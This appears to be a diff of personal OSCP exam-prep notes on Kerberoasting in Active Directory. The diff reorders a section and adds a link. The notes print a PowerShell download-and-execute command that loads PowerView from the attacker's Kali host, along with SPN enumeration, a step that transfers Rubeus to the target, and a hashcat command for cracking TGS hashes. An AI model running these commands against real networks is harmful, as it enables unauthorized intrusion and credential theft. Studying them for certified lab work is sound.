@@ -16,46 +16,11 @@ setspn -Q */*
 
 ---
 
-Load PowerView.ps1 into memory 
-
-On KALI
-```
-python -m http.server 80 --directory ~/Desktop/Tools/Windows
-```
-
-On TARGET
-```dataviewjs
-const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
-
-const apage = dv.page("Synced OSCP Notes/Guides/Copy File From Kali to Windows target");const filename = apage?.["filename"] ?? "NO FILENAME FOUND";
-
-const command = `iex(new-object net.webclient).downloadstring('http://${KaliIP}:80/PowerView.ps1')`;
-
-dv.paragraph("```bash\n" + command + "\n```");
-```
-
-Verify commands are loaded
-```powershell
-Get-Command Get-DomainUser
-```
- 
- 2. Query all active user accounts with an SPN set 
-
- ```powershell
-Get-DomainUser -SPN | Select-Object samaccountname, serviceprincipalname
- ```
- 
-![[Pasted image 20260817222346.png]]
-
-Kerberoasting is a technique that allows attackers to request a Kerberos ticket for a service associated with a Service Principal Name (SPN)
-
-Transfer [[Rubeus.exe]] into VICTIM TARGET
-
-Once Creds are obtained, use [[Runas]]
-
 ## Service Accounts : Requires SVC accounts and creds of a standard user
 
 Whenever getting access to domain credentials it is important to test a few of the tools from `impacket`. In this case we will use `GetUserSPNs.py` to extract encrypted passwords of any kerberoastable service accounts.
+
+[[Clock Skew Time Sync]]
 
 User:: svc_apache
 ```dataviewjs
@@ -94,6 +59,45 @@ or
 ```
 hashcat -m 13100 [hashes] /usr/share/wordlists/rockyou.txt
 ```
+
+---
+
+Load PowerView.ps1 into memory 
+
+On KALI
+```
+python -m http.server 80 --directory ~/Desktop/Tools/Windows
+```
+
+On TARGET
+```dataviewjs
+const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
+
+const apage = dv.page("Synced OSCP Notes/Guides/Copy File From Kali to Windows target");const filename = apage?.["filename"] ?? "NO FILENAME FOUND";
+
+const command = `iex(new-object net.webclient).downloadstring('http://${KaliIP}:80/PowerView.ps1')`;
+
+dv.paragraph("```bash\n" + command + "\n```");
+```
+
+Verify commands are loaded
+```powershell
+Get-Command Get-DomainUser
+```
+ 
+ 2. Query all active user accounts with an SPN set 
+
+ ```powershell
+Get-DomainUser -SPN | Select-Object samaccountname, serviceprincipalname
+ ```
+ 
+![[Pasted image 20260817222346.png]]
+
+Kerberoasting is a technique that allows attackers to request a Kerberos ticket for a service associated with a Service Principal Name (SPN)
+
+Transfer [[Rubeus.exe]] into VICTIM TARGET
+
+Once Creds are obtained, use [[Runas]]
 
 ---
 
